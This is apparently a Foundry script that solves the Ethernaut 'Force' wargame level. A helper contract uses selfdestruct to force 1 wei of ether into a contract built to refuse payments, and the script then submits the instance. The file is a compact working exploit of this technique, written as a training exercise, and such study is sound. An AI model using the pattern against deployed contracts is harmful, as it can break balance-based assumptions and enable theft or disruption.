// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";

import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Force} from "../src/Force.sol";

/**
 *
 * Level address: 0xb6c2Ec883DaAac76D8922519E63f875c2ec65575
 * Some contracts will simply not take your money ¯\_(ツ)_/¯
 *
 * The goal of this level is to make the balance of the contract greater than
 * zero.
 *
 *   Things that might help:
 *
 * Fallback methods
 * Sometimes the best way to attack a contract is with another contract.
 *
 */
contract Pwn {
    constructor(Force victim) payable {
        selfdestruct(payable(address(victim)));
    }
}

contract ForceScript is Attacker {
    Level private level = Level(0xb6c2Ec883DaAac76D8922519E63f875c2ec65575);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Force force = Force(payable(instance));

        new Pwn{value: 1 wei}(force);

        require(submitInstance());
        vm.stopBroadcast();
    }
}
